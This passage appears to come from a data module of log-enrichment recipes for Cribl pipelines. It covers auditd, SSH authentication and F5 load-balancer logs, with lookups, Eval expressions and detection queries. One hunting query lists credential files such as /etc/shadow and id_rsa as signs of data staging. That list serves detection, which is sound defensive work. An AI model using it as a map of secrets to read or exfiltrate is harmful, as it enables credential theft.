          notes: 'Validates RPZ blocks are effective. If a client is blocked via DNS but still connects (via hardcoded IP or alt DNS), the block is bypassed. Requires firewall log correlation.'
        }
      }
    ]
  },
  'linux-auditd': {
    streamTime: [
      {
        name: 'User Identity Resolution',
        description: 'Resolve numeric UID/GID/AUID values to human-readable usernames and group names using /etc/passwd and LDAP/AD lookup tables.',
        criblFunction: 'Lookup',
        addedFields: ['auid_username', 'uid_username', 'euid_username', 'gid_groupname'],
        securityValue: 'Eliminates analyst lookup time during investigations. Immediately identifies who performed the action (auid) vs what identity they assumed (euid). Critical for privilege escalation detection where euid=0 but auid is a named user.',
        observabilityValue: 'Enables user-centric dashboards showing process execution patterns per engineer, supports capacity planning by team/user.',
        personas: ['SOC', 'Incident Response', 'Security Engineering', 'Platform Engineering'],
        implementation: {
          lookupSample: 'uid,username,shell,home,groups\n0,root,/bin/bash,/root,root;wheel\n1000,jsmith,/bin/bash,/home/jsmith,developers;docker\n1001,jenkins,/bin/false,/var/lib/jenkins,jenkins;ci\n65534,nobody,/usr/sbin/nologin,/nonexistent,nogroup',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: passwd_lookup.csv (generated from /etc/passwd + LDAP)\n// Input 1: auid → uid → Output: username → auid_username\n// Input 2: uid → uid → Output: username → uid_username\n// Input 3: euid → uid → Output: username → euid_username\n//\n// Result: { auid: "1000", uid: "0", euid: "0", auid_username: "jsmith", uid_username: "root", euid_username: "root" }\n// Interpretation: jsmith logged in (auid=1000) and is now running as root (euid=0) — privilege escalation context',
          notes: 'Generate from: getent passwd | awk -F: \'{print $3","$1","$7","$6}\'. For LDAP environments, also pull from ldapsearch. Refresh every hour.'
        }
      },
      {
        name: 'Syscall Name Resolution',
        description: 'Map numeric syscall numbers to human-readable names (59→execve, 2→open, 42→connect, 49→bind) using architecture-specific lookup table.',
        criblFunction: 'Lookup',
        addedFields: ['syscall_name', 'syscall_category'],
        securityValue: 'Analysts can immediately understand what operation occurred without memorizing syscall tables. Enables category-based detection rules (all network syscalls, all file syscalls) without maintaining numeric lists.',
        observabilityValue: 'Enables syscall distribution dashboards, identifies unusual syscall patterns indicating application issues or resource contention.',
        personas: ['SOC', 'Security Engineering', 'Incident Response', 'Platform Engineering'],
        implementation: {
          lookupSample: 'number,name,category\n0,read,file-io\n1,write,file-io\n2,open,file-io\n42,connect,network\n49,bind,network\n59,execve,process\n62,kill,signal\n257,openat,file-io',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: syscall_names_x86_64.csv\n// Input: syscall → number (exact match)\n// Output: name → syscall_name, category → syscall_category\n//\n// Result: { syscall: "59", syscall_name: "execve", syscall_category: "process" }\n// Result: { syscall: "42", syscall_name: "connect", syscall_category: "network" }',
          notes: 'Generate from: ausyscall --dump on a Linux system. Architecture-specific (x86_64 vs aarch64 have different numbers). Use the correct table for your fleet.'
        }
      },
      {
        name: 'Process Reputation Scoring',
        description: 'Enrich exe field against a known-good baseline of expected binaries per host role. Flag executables not in the approved software inventory.',
        criblFunction: 'Lookup',
        addedFields: ['exe_known', 'exe_risk_score', 'exe_expected_role', 'exe_first_seen'],
        securityValue: 'Immediately identifies unexpected or unauthorized software execution. Living-off-the-land binaries in unexpected contexts (python on a web server not running Python apps) get flagged automatically.',
        observabilityValue: 'Tracks software inventory drift, identifies unauthorized tool installations, supports compliance auditing for approved software lists.',
        personas: ['SOC', 'Security Engineering', 'Compliance', 'Platform Engineering'],
        implementation: {
          lookupSample: 'exe_path,known,risk_score,expected_roles,first_seen\n/usr/bin/bash,true,0,all,baseline\n/usr/bin/python3,true,10,dev;ci;ml,baseline\n/usr/bin/wget,true,30,ci;dev,baseline\n/tmp/suspicious,false,90,,never\n/usr/local/bin/custom-tool,true,5,web-server,2026-03-15',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: exe_reputation.csv\n// Input: exe → exe_path (exact match)\n// Output: known → exe_known, risk_score → exe_risk_score, expected_roles → exe_expected_role\n//\n// Add Eval: exe_known = exe_known || \'false\'; exe_risk_score = exe_risk_score || 100\n// (Unknown executables default to high risk)\n//\n// Result: { exe: "/tmp/suspicious", exe_known: "false", exe_risk_score: 90 }\n// Result: { exe: "/usr/bin/bash", exe_known: "true", exe_risk_score: 0 }',
          notes: 'Baseline from: find / -executable -type f on golden images. Track new executables via auditd EXECVE events. Unknown exe in production = investigate.'
        }
      },
      {
        name: 'Host Role Classification',
        description: 'Tag audit events with the host role (web-server, database, jump-box, CI-runner, container-host) based on hostname patterns or CMDB lookup.',
        criblFunction: 'Lookup',
        addedFields: ['host_role', 'host_environment', 'host_criticality', 'host_owner_team'],
        securityValue: 'Enables role-appropriate detection rules: a database server running wget is suspicious, a CI runner is not. Reduces false positives by 40-60% through context-aware alerting.',
        observabilityValue: 'Enables per-role performance dashboards, identifies workload distribution across host types, supports capacity planning by role.',
        personas: ['SOC', 'Security Engineering', 'NOC', 'Platform Engineering'],
        implementation: {
          lookupSample: 'hostname_pattern,role,environment,criticality,owner_team\nweb-prod-*,web-server,production,Tier-1,platform-team\ndb-prod-*,database,production,Tier-1,dba-team\njump-*,bastion,production,Tier-2,security-ops\nci-runner-*,ci-runner,ci,Tier-3,devops-team',
          example: '// Cribl Stream → Processing → Lookup Function (wildcard/regex match)\n// Lookup File: host_roles.csv\n// Input: hostname → hostname_pattern (wildcard match)\n// Output: role → host_role, environment → host_environment, criticality → host_criticality, owner_team → host_owner_team\n//\n// Result: { hostname: "web-prod-03", host_role: "web-server", host_environment: "production", host_criticality: "Tier-1" }',
          notes: 'Use hostname naming conventions or CMDB lookup. Enables detection like: "wget on a web-server = suspicious (risk_score + 50), wget on a ci-runner = expected (risk_score + 0)".'
        }
      },
      {
        name: 'Proctitle Hex Decoder',
        description: 'Decode hex-encoded proctitle field into human-readable command line at pipeline time, eliminating the need for analysts to manually decode.',
        criblFunction: 'Eval',
        addedFields: ['proctitle_decoded', 'proctitle_arg_count'],
        securityValue: 'Makes command lines immediately searchable and readable. Encoded proctitle is the most complete command record in auditd but is useless without decoding. Critical for detection rules matching on command arguments.',
        observabilityValue: 'Enables command frequency analysis and longest-command tracking without search-time decoding overhead.',
        personas: ['SOC', 'Incident Response', 'Threat Hunting', 'Security Engineering'],
        implementation: {
          example: '// Cribl Stream → Processing → Eval Function\n// Expression:\n// proctitle_decoded = proctitle ? Buffer.from(proctitle.replace(/00/g, \' \').trim(), \'hex\').toString(\'utf8\').trim() : \'\'\n// proctitle_arg_count = proctitle_decoded ? proctitle_decoded.split(\' \').length : 0\n//\n// Or using Cribl\'s built-in hex decode:\n// proctitle_decoded = C.Decode.hex(proctitle).replace(/\\x00/g, \' \').trim()\n//\n// Input:  { proctitle: "6C73002D6C61002F746D70" }\n// Result: { proctitle_decoded: "ls -la /tmp", proctitle_arg_count: 3 }',
          notes: 'Auditd encodes proctitle as hex with null (00) separators between arguments. Decode at pipeline to make searchable. This is the most complete command-line record in auditd.'
        }
      },
      {
        name: 'Audit Rule Context Enrichment',
        description: 'Map the audit key field to rule metadata: rule description, severity, compliance requirement, and expected event volume.',
        criblFunction: 'Lookup',
        addedFields: ['rule_description', 'rule_severity', 'rule_compliance_req', 'rule_expected_volume'],
        securityValue: 'Provides immediate context about why an event was logged. Key "file_integrity" maps to "CIS Benchmark 5.2.1 - Critical file monitoring" enabling compliance-driven prioritization.',
        observabilityValue: 'Identifies noisy rules generating disproportionate event volume, supports audit rule optimization and coverage analysis.',
        personas: ['Security Engineering', 'Compliance', 'Platform Engineering'],
        implementation: {
          lookupSample: 'key,description,severity,compliance_req,expected_volume_per_hour\nfile_integrity,Critical system file modification monitoring,critical,CIS 5.2.1;PCI 10.5,50\npriv_escalation,Privilege escalation via setuid/sudo,high,CIS 4.1.11,200\nnetwork_connect,Outbound network connections,medium,CIS 4.1.14,5000\nmodule_load,Kernel module loading events,critical,CIS 4.1.17,5',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: audit_rules_context.csv\n// Input: key → key (exact match)\n// Output: description → rule_description, severity → rule_severity, compliance_req → rule_compliance_req, expected_volume_per_hour → rule_expected_volume\n//\n// Result: { key: "file_integrity", rule_description: "Critical system file modification monitoring", rule_severity: "critical", rule_compliance_req: "CIS 5.2.1;PCI 10.5" }',
          notes: 'Generate from your auditd rules: auditctl -l | grep key= and document each rule purpose. Essential for compliance mapping and alert prioritization.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Process Tree Reconstruction',
        description: 'Join audit events by serial number and session ID to reconstruct full process trees: parent→child→grandchild execution chains.',
        criblFunction: 'Search-time dataset join',
        addedFields: ['process_tree', 'tree_depth', 'root_ancestor_exe', 'session_command_count'],
        securityValue: 'Enables investigation of full attack chains: see how a webshell spawned a shell that downloaded malware that established persistence. Process tree context is the #1 analyst need during Linux investigations.',
        personas: ['Incident Response', 'Threat Hunting', 'SOC'],
        implementation: {
          example: '// Cribl Search process tree query:\n// dataset="auditd_logs" type=="SYSCALL" syscall_name=="execve" hostname=="web-prod-01" earliest=-1h\n// | extend process_key = strcat(ses, ":", pid)\n// | extend parent_key = strcat(ses, ":", ppid)\n// | order by timestamp asc\n// | summarize Commands=makeset(proctitle_decoded), exe_list=makeset(exe) by ses, auid_username\n// | extend session_command_count = array_length(Commands)\n// | order by session_command_count desc',
          notes: 'Group by ses (audit session ID) for all activity within one login session. The serial field links related multi-record events (SYSCALL+EXECVE+PATH).'
        }
      },
      {
        name: 'File Access Pattern Analysis',
        description: 'Aggregate file access events (PATH records) by user session to identify bulk file access patterns indicating data staging or exfiltration.',
        criblFunction: 'Search-time aggregation',
        addedFields: ['files_accessed_count', 'unique_directories', 'sensitive_files_accessed', 'access_pattern_type'],
        securityValue: 'Identifies data staging behavior: a user accessing hundreds of files across multiple directories in a short window is likely collecting data for exfiltration. Reveals insider threat patterns not visible in single-event analysis.',
        personas: ['Threat Hunting', 'Incident Response', 'Insider Threat'],
        implementation: {
          example: '// Cribl Search file access analysis:\n// dataset="auditd_logs" type=="PATH" auid_username=="$USER" earliest=-4h\n// | summarize files_accessed_count=count(), unique_directories=dcount(cwd),\n//     sensitive_files=countif(path_name has_any ("/etc/shadow", "/etc/passwd", ".ssh/", "id_rsa"))\n//   by auid_username, ses, hostname\n// | extend access_pattern_type = iif(sensitive_files > 3, "data-staging", iif(files_accessed_count > 100, "bulk-access", "normal"))\n// | where access_pattern_type != "normal"',
          notes: 'Identifies bulk file access patterns that indicate data staging for exfiltration. A user touching 100+ files across many directories in one session is abnormal.'
        }
      }
    ]
  },
  'linux-auth': {
    streamTime: [
      {
        name: 'GeoIP on Source IP',
        description: 'Add geographic context (country, city, ASN) to SSH source_ip for remote login events.',
        criblFunction: 'GeoIP',
        addedFields: ['src_country', 'src_city', 'src_asn', 'src_org'],
        securityValue: 'Enables impossible travel detection for SSH — if a user authenticates from two countries within minutes, it indicates credential compromise. Immediately flags logins from unexpected geographies.',
        observabilityValue: 'Tracks remote workforce distribution, identifies regional connectivity patterns, supports bandwidth planning for remote access infrastructure.',
        personas: ['SOC', 'Security Engineering', 'NOC', 'Compliance'],
        implementation: {
          example: '// Cribl Stream → Processing → GeoIP Function\n// Input Field: source_ip\n// Output Fields: src_country, src_city, src_asn, src_org\n// Filter: Only apply when source_ip is not RFC1918 (skip internal-to-internal SSH)\n//\n// Result: { source_ip: "203.0.113.50", src_country: "RU", src_city: "Moscow", src_asn: "AS12345", src_org: "Example ISP" }',
          notes: 'Only enriches external source IPs. Internal SSH (10.x → 10.x) skips GeoIP for performance. Use the Internal/External classification enrichment as a pre-filter.'
        }
      },
      {
        name: 'Internal/External IP Classification',
        description: 'Classify source_ip as internal (RFC1918, organizational ranges) or external using CIDR lookup table.',
        criblFunction: 'Lookup',
        addedFields: ['src_internal', 'src_network_segment', 'src_trust_level'],
        securityValue: 'Immediately distinguishes external attacks from internal lateral movement. External brute force vs internal pivot have completely different response playbooks and urgency levels.',
        observabilityValue: 'Enables internal vs external login ratio tracking, identifies SSH jump patterns, monitors bastion host usage vs direct server access.',
        personas: ['SOC', 'Security Engineering', 'NOC', 'Platform Engineering'],
        implementation: {
          lookupSample: 'cidr,classification,segment_name,trust_level\n10.0.0.0/8,internal,corporate,high\n172.16.0.0/12,internal,cloud-private,high\n192.168.0.0/16,internal,site-local,medium\n100.64.0.0/10,internal,vpn-pool,medium',
          example: '// Cribl Stream → Processing → Lookup Function (CIDR match)\n// Lookup File: internal_networks.csv\n// Input: source_ip → cidr (CIDR match)\n// Output: classification → src_internal, segment_name → src_network_segment, trust_level → src_trust_level\n//\n// Result: { source_ip: "10.1.2.50", src_internal: "internal", src_network_segment: "corporate", src_trust_level: "high" }\n// Result: { source_ip: "203.0.113.1", src_internal: "external", src_network_segment: "internet", src_trust_level: "none" }',
          notes: 'Same CIDR file used across all sources. When src_internal="external" and auth_result="success", that is a high-priority event.'
        }
      },
      {
        name: 'User Risk Scoring',
        description: 'Enrich user field with risk tier (privileged, service-account, standard, contractor) and expected access patterns based on IAM/HR data.',
        criblFunction: 'Lookup',
        addedFields: ['user_risk_tier', 'user_department', 'user_expected_hosts', 'user_account_type'],
        securityValue: 'Prioritize alerts for privileged accounts. A failed login to "root" from external is critical; a failed login to "jenkins" from the CI subnet is likely a credential rotation lag. Context enables proportional response.',
        observabilityValue: 'Tracks login patterns by account type, identifies service accounts with excessive access, supports access review automation.',
        personas: ['SOC', 'Security Engineering', 'Compliance', 'Identity Team'],
        implementation: {
          lookupSample: 'username,risk_tier,department,expected_hosts,account_type\nroot,privileged,,all,system\njenkins,service-account,DevOps,ci-runner-*,service\njsmith,standard,Engineering,dev-*;staging-*,user\ncontractor-bob,contractor,Consulting,dev-*,contractor',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: user_risk_tiers.csv\n// Input: user → username\n// Output: risk_tier → user_risk_tier, department → user_department, expected_hosts → user_expected_hosts, account_type → user_account_type\n//\n// Result: { user: "contractor-bob", user_risk_tier: "contractor", user_expected_hosts: "dev-*", user_account_type: "contractor" }\n// Alert if: contractor accessing production hosts (hostname doesn\'t match user_expected_hosts pattern)',
          notes: 'Combine HR data (contractors vs employees) with infrastructure access matrix. Expected_hosts uses wildcard patterns for flexible matching.'
        }
      },
      {
        name: 'SSH Key Fingerprint Registry',
        description: 'Enrich ssh_key_fingerprint against known-key registry to identify authorized vs unknown keys and key owner.',
        criblFunction: 'Lookup',
        addedFields: ['key_owner', 'key_registered', 'key_creation_date', 'key_approved_hosts'],
        securityValue: 'Detects unauthorized key usage immediately at pipeline. An unregistered key successfully authenticating indicates either a rogue key deployment or a gap in key management. Critical for SSH key sprawl control.',
        observabilityValue: 'Tracks key usage patterns, identifies unused/stale keys for rotation, supports key lifecycle management dashboards.',
        personas: ['Security Engineering', 'Identity Team', 'Compliance', 'Platform Engineering'],
        implementation: {
          lookupSample: 'fingerprint,owner,registered,creation_date,approved_hosts\nSHA256:abc123def456...,jsmith,true,2026-01-15,dev-*;staging-*\nSHA256:xyz789ghi012...,admin-bob,true,2025-11-01,*\nSHA256:unknown-key...,unknown,false,,',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: ssh_key_registry.csv\n// Input: ssh_key_fingerprint → fingerprint (exact match)\n// Output: owner → key_owner, registered → key_registered, creation_date → key_creation_date, approved_hosts → key_approved_hosts\n//\n// Result: { ssh_key_fingerprint: "SHA256:abc123def456...", key_owner: "jsmith", key_registered: "true" }\n// Alert if: key_registered == "false" AND auth_result == "success" → unregistered key used successfully',
          notes: 'Populate from: ssh-keygen -lf /path/to/authorized_keys across all servers. Or from SSH CA if using certificate-based auth. Unknown keys = immediate investigation.'
        }
      },
      {
        name: 'Host Access Policy Check',
        description: 'Validate user+hostname combinations against access control matrix to tag events as compliant or policy-violating at ingest time.',
        criblFunction: 'Lookup',
        addedFields: ['access_authorized', 'access_policy_name', 'access_exception_id'],
        securityValue: 'Flags policy violations in real-time: user "contractor-bob" accessing production database server when their access matrix only allows dev. Enables zero-trust validation at the log pipeline layer.',
        observabilityValue: 'Tracks access pattern compliance rates, identifies over-provisioned access, supports automated access review evidence collection.',
        personas: ['Security Engineering', 'Compliance', 'Identity Team', 'SOC'],
        implementation: {
          lookupSample: 'user,hostname_pattern,authorized,policy_name,exception_id\njsmith,dev-*,true,developer-access,\njsmith,prod-*,false,developer-access,\nadmin-bob,*,true,admin-full-access,\ncontractor-bob,dev-api-*,true,contractor-limited,EXC-2026-042',
          example: '// Cribl Stream → Processing → Lookup Function (compound key + wildcard)\n// Lookup File: access_policy_matrix.csv\n// Input: user + hostname → user + hostname_pattern (match)\n// Output: authorized → access_authorized, policy_name → access_policy_name, exception_id → access_exception_id\n//\n// Result: { user: "jsmith", hostname: "prod-db-01", access_authorized: "false", access_policy_name: "developer-access" }\n// Alert: access_authorized == "false" AND auth_result == "success" → policy violation (user accessed unauthorized host)',
          notes: 'Implements zero-trust access validation at the log layer. Even if SSH succeeds (access was granted), policy says it should not have been. Flags for access review.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Session Activity Correlation',
        description: 'Join SSH session open/close events with sudo commands executed during that session to build complete session activity timelines.',
        criblFunction: 'Search-time dataset join',
        addedFields: ['session_duration', 'commands_executed', 'privilege_escalations', 'session_risk_score'],
        securityValue: 'Provides full session context during investigations: "User X logged in at 02:00, escalated to root, ran 15 commands including tar and scp, then disconnected." Complete incident timeline in one query.',
        personas: ['Incident Response', 'Threat Hunting', 'SOC', 'Compliance'],
        implementation: {
          example: '// Cribl Search session reconstruction:\n// dataset="linux_auth" user=="jsmith" session_action=="opened" earliest=-8h\n// | join kind=left (\n//     dataset="linux_auth" user=="jsmith" process=="sudo" earliest=-8h\n//     | summarize sudo_commands=makeset(command), escalation_count=count() by user, hostname\n//   ) on user, hostname\n// | extend session_risk_score = iif(escalation_count > 5, 80, iif(escalation_count > 0, 40, 10))',
          notes: 'Joins session open events with sudo activity within that session. High sudo count = high session risk score. Provides complete session timeline for forensics.'
        }
      },
      {
        name: 'Peer Group Baseline Comparison',
        description: 'Compare a user\'s current login behavior against their peer group (same role/team) to identify statistical outliers.',
        criblFunction: 'Search-time dataset join',
        addedFields: ['peer_avg_logins', 'peer_avg_hosts', 'deviation_from_peer', 'peer_group'],
        securityValue: 'A DBA logging into 30 servers when their peers access 3-5 is anomalous regardless of absolute thresholds. Peer comparison adapts to team norms without manual threshold tuning.',
        personas: ['Threat Hunting', 'Security Engineering', 'Insider Threat'],
        implementation: {
          example: '// Cribl Search peer comparison:\n// dataset="linux_auth" auth_result=="success" earliest=-7d\n// | summarize daily_logins=count(), unique_hosts=dcount(hostname) by user, user_department\n// | summarize peer_avg_logins=avg(daily_logins), peer_avg_hosts=avg(unique_hosts), my_logins=maxif(daily_logins, user=="$USER"), my_hosts=maxif(unique_hosts, user=="$USER") by user_department\n// | extend deviation_from_peer = round((my_logins - peer_avg_logins) / peer_avg_logins * 100, 1)\n// | where deviation_from_peer > 200',
          notes: 'Compares individual behavior against team norms. A DBA accessing 30 hosts when peers access 3 is a 900% deviation — suspicious regardless of absolute thresholds.'
        }
      }
    ]
  },
  'f5-bigip-ltm': {
    streamTime: [
      {
        name: 'Client GeoIP Enrichment',
        description: 'Add geographic context (country, city, ASN, organization) to client_ip and x_forwarded_for for traffic origin analysis.',
        criblFunction: 'GeoIP',
        addedFields: ['client_country', 'client_city', 'client_asn', 'client_org'],
        securityValue: 'Enables geographic access policies at the data layer — immediately flag traffic from embargoed nations or unexpected origins. Supports impossible travel detection when correlated with user identity.',
        observabilityValue: 'Enables geographic traffic distribution dashboards, CDN hit/miss analysis by region, and latency correlation with client distance from F5 data centers.',
        personas: ['SOC', 'Security Engineering', 'NOC', 'Platform Engineering'],
        implementation: {
          example: '// Cribl Stream → Processing → GeoIP Function\n// Pre-Eval (determine true client IP):\n//   true_client = x_forwarded_for ? x_forwarded_for.split(\',\')[0].trim() : client_ip\n// GeoIP Input: true_client\n// Output: client_country, client_city, client_asn, client_org\n//\n// Result: { client_ip: "10.0.0.1", x_forwarded_for: "198.51.100.42", client_country: "US", client_asn: "AS15169" }',
          notes: 'If F5 is behind a CDN, use x_forwarded_for. If F5 is the internet edge, use client_ip directly. Check your deployment topology.'
        }
      },
      {
        name: 'Backend Service Classification',
        description: 'Map pool_name and virtual_server to application service name, owning team, environment tier, and business criticality based on service catalog lookup.',
        criblFunction: 'Lookup',
        addedFields: ['service_name', 'service_team', 'service_environment', 'service_criticality', 'service_slo_target'],
        securityValue: 'Enables criticality-weighted alerting: attacks against Tier-1 services (payment, auth) trigger immediate escalation while Tier-3 (internal tools) can be batched. Associates attacks with business impact.',
        observabilityValue: 'Foundation for SLO monitoring per service. Enables team-level dashboards showing "your services" latency and error rates without requiring each team to configure custom filters.',
        personas: ['SRE', 'Platform Engineering', 'NOC', 'Application Development', 'SOC'],
        implementation: {
          lookupSample: 'pool_name,service_name,team,environment,criticality,slo_target_ms\n/Common/api_pool,user-api,platform-team,production,Tier-1,200\n/Common/payment_pool,payment-service,commerce-team,production,Tier-1,150\n/Common/static_pool,static-assets,cdn-team,production,Tier-3,50\n/Common/admin_pool,admin-portal,internal-tools,production,Tier-2,500',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: f5_service_catalog.csv\n// Input: pool_name → pool_name (exact match)\n// Output: service_name, team → service_team, environment → service_environment, criticality → service_criticality, slo_target_ms → service_slo_target\n//\n// Result: { pool_name: "/Common/api_pool", service_name: "user-api", service_team: "platform-team", service_criticality: "Tier-1", service_slo_target: "200" }',
          notes: 'Generate from: tmsh list ltm pool | grep -E "pool|members". Map each pool to the application team that owns it. Include SLO target for automatic compliance checking.'
        }
      },
      {
        name: 'Client Reputation Scoring',
        description: 'Enrich client_ip against threat intelligence feeds, known bot lists, and historical abuse data to assign a reputation score at ingest time.',
        criblFunction: 'Lookup',
        addedFields: ['client_reputation_score', 'client_reputation_category', 'client_is_known_bot', 'client_abuse_history'],
        securityValue: 'Enables risk-proportional response at the pipeline: known-bad IPs get full logging and immediate alert, neutral IPs get standard treatment, known-good (partners, CDNs) get reduced scrutiny. Reduces SOC alert volume by 30-50%.',
        observabilityValue: 'Tracks legitimate vs bot traffic ratios over time, identifies traffic composition changes, supports capacity planning that accounts for bot load.',
        personas: ['SOC', 'Security Engineering', 'Platform Engineering', 'NOC'],
        implementation: {
          lookupSample: 'ip,reputation_score,category,is_known_bot,abuse_history\n198.51.100.1,90,malicious-scanner,true,50-attacks-last-week\n203.0.113.50,20,legitimate-partner,false,none\n10.0.0.0/8,0,internal,false,none',
          example: '// Cribl Stream → Processing → Lookup Function (CIDR + exact match)\n// Lookup File: client_reputation.csv\n// Input: client_ip → ip (CIDR match for ranges, exact for specifics)\n// Output: reputation_score → client_reputation_score, category → client_reputation_category, is_known_bot → client_is_known_bot\n//\n// Result: { client_ip: "198.51.100.1", client_reputation_score: 90, client_reputation_category: "malicious-scanner", client_is_known_bot: "true" }',
          notes: 'Aggregate from: AbuseIPDB, Spamhaus, internal block lists, and bot detection results. Known-good partners get score 0 to skip security checks and reduce alert noise.'
        }
      },
      {
        name: 'URI Path Classification',
        description: 'Classify http_uri into functional categories (API endpoint, static asset, health check, admin panel, authentication) using pattern matching rules.',
        criblFunction: 'Regex Extract',
        addedFields: ['uri_category', 'uri_api_version', 'uri_is_sensitive', 'uri_is_static'],
        securityValue: 'Enables targeted detection rules: attacks against /admin or /api/auth are high-priority regardless of volume, while scanning of /robots.txt is informational. Static asset requests can be safely aggregated.',
        observabilityValue: 'Enables per-endpoint-category performance dashboards without high-cardinality URI explosion. Track API vs static vs health check latency separately.',
        personas: ['Security Engineering', 'SRE', 'Application Development', 'Platform Engineering'],
        implementation: {
          example: '// Cribl Stream → Processing → Eval Function\n// Expressions:\n// uri_category = http_uri.match(/^\\/api\\//) ? \'api\'\n//   : http_uri.match(/^\\/(static|assets|css|js|img|fonts)\\//) ? \'static\'\n//   : http_uri.match(/^\\/(admin|management|console)\\//) ? \'admin\'\n//   : http_uri.match(/^\\/(login|auth|oauth|saml)\\//) ? \'authentication\'\n//   : http_uri.match(/^\\/health/) ? \'health-check\' : \'page\'\n//\n// uri_api_version = http_uri.match(/\\/v(\\d+)\\//)?.[1] || \'\'\n// uri_is_sensitive = /\\/(admin|auth|payment|api\\/v\\d+\\/users)/.test(http_uri) ? \'true\' : \'false\'\n// uri_is_static = uri_category == \'static\' ? \'true\' : \'false\'\n//\n// Result: { http_uri: "/api/v2/users/profile", uri_category: "api", uri_api_version: "2", uri_is_sensitive: "true" }',
          notes: 'Customize regex patterns for your application structure. Static assets can be safely aggregated (90% volume reduction). API and auth paths keep full fidelity.'
        }
      },
      {
        name: 'Response Time Percentile Tagging',
        description: 'Tag each request with a latency tier (fast/normal/slow/critical) based on pre-computed percentile thresholds per virtual_server and pool.',
        criblFunction: 'Eval',
        addedFields: ['latency_tier', 'latency_percentile', 'exceeds_slo'],
        securityValue: 'Abnormally slow responses may indicate server-side exploitation (time-based SQL injection, resource exhaustion attacks). Latency tier enables security correlation without raw ms thresholds.',
        observabilityValue: 'Enables instant SLO compliance tracking at the event level. Every request is pre-tagged as meeting or missing SLO, enabling real-time compliance dashboards without search-time calculation.',
        personas: ['SRE', 'Platform Engineering', 'Application Development', 'NOC'],
        implementation: {
          example: '// Cribl Stream → Processing → Eval Function\n// Expression (using per-service SLO targets from Backend Service Classification):\n//\n// latency_tier = response_time_ms < 100 ? \'fast\'\n//   : response_time_ms < 500 ? \'normal\'\n//   : response_time_ms < 2000 ? \'slow\' : \'critical\'\n//\n// exceeds_slo = (service_slo_target && response_time_ms > parseInt(service_slo_target)) ? \'true\' : \'false\'\n//\n// Result: { response_time_ms: 1500, service_slo_target: "200", latency_tier: "slow", exceeds_slo: "true" }',
          notes: 'SLO targets come from the Backend Service Classification lookup. Each request is pre-tagged as meeting or missing SLO — enables real-time compliance percentage dashboards.'
        }
      },
      {
        name: 'SSL/TLS Compliance Assessment',
        description: 'Evaluate ssl_protocol and ssl_cipher against organizational compliance policy to flag non-compliant connections at ingest time.',
        criblFunction: 'Eval',
        addedFields: ['tls_compliant', 'tls_risk_level', 'cipher_strength', 'protocol_deprecated'],
        securityValue: 'Immediately identifies clients using deprecated TLS versions or weak ciphers without requiring post-hoc analysis. Critical for PCI-DSS compliance monitoring and crypto-agility tracking.',
        observabilityValue: 'Tracks TLS version adoption over time, identifies client populations still requiring legacy protocol support, informs deprecation timelines.',
        personas: ['Security Engineering', 'Compliance', 'Platform Engineering', 'SOC'],
        implementation: {
          example: '// Cribl Stream → Processing → Eval Function\n// Expressions:\n// protocol_deprecated = (ssl_protocol == \'TLSv1\' || ssl_protocol == \'TLSv1.1\') ? \'true\' : \'false\'\n// cipher_strength = ssl_cipher.match(/AES256|CHACHA20/) ? \'strong\'\n//   : ssl_cipher.match(/AES128/) ? \'acceptable\'\n//   : ssl_cipher.match(/RC4|DES|3DES|NULL/) ? \'weak\' : \'unknown\'\n// tls_compliant = (protocol_deprecated==\'false\' && cipher_strength!=\'weak\') ? \'true\' : \'false\'\n// tls_risk_level = protocol_deprecated==\'true\' ? \'high\' : cipher_strength==\'weak\' ? \'high\' : \'low\'\n//\n// Result: { ssl_protocol: "TLSv1", ssl_cipher: "RC4-SHA", tls_compliant: "false", tls_risk_level: "high", protocol_deprecated: "true" }',
          notes: 'PCI-DSS requires TLS 1.2+. Flag any TLS 1.0/1.1 connections for compliance reporting. Track cipher_strength to plan deprecation timelines.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Session Reconstruction',
        description: 'Join multiple requests from the same client_ip and connection_id to reconstruct full user sessions, including page flow and timing between requests.',
        criblFunction: 'Search-time dataset join',
        addedFields: ['session_requests', 'session_duration', 'session_pages_visited', 'session_error_count'],
        securityValue: 'Enables full attack chain reconstruction: see the complete sequence from initial reconnaissance (scanning) through exploitation (attack payload) to data access. Critical for incident scope assessment.',
        personas: ['Incident Response', 'Threat Hunting', 'SOC'],
        implementation: {
          example: '// Cribl Search session analysis:\n// dataset="f5_ltm_logs" client_ip="198.51.100.42" earliest=-1h\n// | order by timestamp asc\n// | summarize session_requests=count(), session_duration=datetime_diff(\'second\', max(timestamp), min(timestamp)),\n//     pages_visited=dcount(http_uri), error_count=countif(http_status >= 400),\n//     total_bytes_out=sum(bytes_out)\n//   by client_ip, http_host, user_agent\n// | extend session_type = iif(session_requests > 500, "automated/bot", "human")',
          notes: 'Group by client_ip + user_agent for session approximation. For authenticated apps with session cookies, use the cookie value instead for accurate session boundaries.'
        }
      },
      {
        name: 'Baseline Performance Comparison',
        description: 'Join current request data against pre-computed hourly/daily latency baselines per virtual_server and pool to identify statistical anomalies.',
        criblFunction: 'Search-time dataset join',
        addedFields: ['baseline_latency_p50', 'baseline_latency_p95', 'current_vs_baseline_ratio', 'anomaly_detected'],
        securityValue: 'Latency anomalies can indicate exploitation, resource exhaustion attacks, or cryptomining. Statistical comparison distinguishes real attacks from normal traffic fluctuation.',
        observabilityValue: 'Enables automated anomaly detection without manual threshold tuning. "Is this latency normal for this service at this time of day?" answered instantly.',
        personas: ['SRE', 'NOC', 'Platform Engineering', 'Threat Hunting'],
        implementation: {
          example: '// Cribl Search baseline comparison:\n// dataset="f5_ltm_logs" virtual_server=="/Common/vs_api_443" earliest=-1h\n// | summarize current_p50=percentile(response_time_ms, 50), current_p95=percentile(response_time_ms, 95), current_count=count() by pool_name\n// | join kind=left (\n//     dataset="f5_baselines" earliest=-8d latest=-1d\n//     | summarize baseline_p50=avg(p50_latency), baseline_p95=avg(p95_latency) by pool_name\n//   ) on pool_name\n// | extend p95_ratio = round(current_p95 / baseline_p95, 2)\n// | where p95_ratio > 2.0\n// | order by p95_ratio desc',
